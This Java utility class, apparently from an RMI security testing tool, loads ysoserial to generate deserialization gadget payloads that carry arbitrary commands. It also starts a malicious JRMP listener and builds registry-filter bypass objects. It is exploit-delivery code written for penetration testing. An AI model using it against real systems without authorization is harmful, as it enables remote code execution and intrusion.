package de.qtc.rmg.utils;

import java.io.File;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Arrays;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.operations.RegistryClient;

public class YsoIntegration {

    private static String[] bypassGadgets = new String[]{"JRMPClient2", "AnTrinh"};

    private static Object generateBypassGadget(String command)
    {
        Object payloadObject = null;
        String[] split = command.split(":");

        if(split.length != 2 || !split[1].matches("\\d+")) {
            ExceptionHandler.invalidListenerFormat(true);
        }

        try {
            payloadObject = RegistryClient.generateBypassObject(split[0], Integer.valueOf(split[1]));
        } catch (Exception e) {
            ExceptionHandler.unexpectedException(e, "bypass object", "generation", true);
        }

        return payloadObject;
    }

    private static URLClassLoader getClassLoader(String ysoPath) throws MalformedURLException
    {
        File ysoJar = new File(ysoPath);

        if( !ysoJar.exists() ) {
            ExceptionHandler.internalError("RMGUtils.createListener", "Error: " + ysoJar.getAbsolutePath() + " does not exist.");
        }

        return new URLClassLoader(new URL[] {ysoJar.toURI().toURL()});
    }

    public static void createJRMPListener(String ysoPath, String port, String gadget, String command)
    {
        try {
            URLClassLoader ucl = getClassLoader(ysoPath);

            Class<?> yso = Class.forName("ysoserial.exploit.JRMPListener", true, ucl);
            Method method = yso.getDeclaredMethod("main", new Class[] {String[].class});

            Logger.printMixedYellow("Creating a", "JRMPListener", "on port ");
            Logger.printlnPlainBlue(port + ".");
            Logger.printlnMixedBlue("Handing off to", "ysoserial...");

            method.invoke(null, new Object[] {new String[] {port, gadget, command}});
            System.exit(0);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "JRMPListener", "creation", true);
        }
    }

    public static Object getPayloadObject(String ysoPath, String gadget, String command)
    {
        if(Arrays.asList(bypassGadgets).contains(gadget)) {
            return generateBypassGadget(command);
        }

        Object ysoPayload = null;

        try {
            URLClassLoader ucl = getClassLoader(ysoPath);

            Class<?> yso = Class.forName("ysoserial.payloads.ObjectPayload$Utils", true, ucl);
            Method method = yso.getDeclaredMethod("makePayloadObject", new Class[] {String.class, String.class});

            Logger.print("Creating ysoserial payload...");
            ysoPayload = method.invoke(null, new Object[] {gadget, command});

        } catch( Exception  e) {
            ExceptionHandler.unexpectedException(e, "gadget", "generation", true);
        }

        Logger.printlnPlain(" done.");
        return ysoPayload;
    }
}
